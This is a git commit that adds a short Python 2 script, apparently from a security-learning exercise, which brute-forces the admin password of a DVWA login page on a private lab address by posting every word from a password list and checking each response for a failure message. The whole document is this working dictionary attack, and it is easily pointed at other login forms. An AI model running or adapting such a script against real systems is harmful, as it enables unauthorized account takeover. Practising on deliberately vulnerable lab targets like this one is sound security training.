df0e19851724954a8525c2c1a8cfbe293820a4e5
Lior Tamir <ltamir@localhost.localdomain>
2020-09-28 20:50:31 +0300

    use post

---
+++ guess_login.py
@@ -0,0 +1,18 @@
+#!/usr/bin/python2
+
+import requests
+
+
+target_url = "http://10.0.2.15/dvwa/login.php"
+formData = {"username" : "admin", "password":"", "Login":"submit"}
+
+with open("./passwords.txt", "r") as pwd_file:
+    for line in pwd_file:
+        word = line.strip()
+        formData["password"] = word
+        response = requests.post(target_url, data=formData)
+        if "Login failed" not in response.content:
+            print("[+] password is " + word)
+            exit()
+
+print("password was not found")
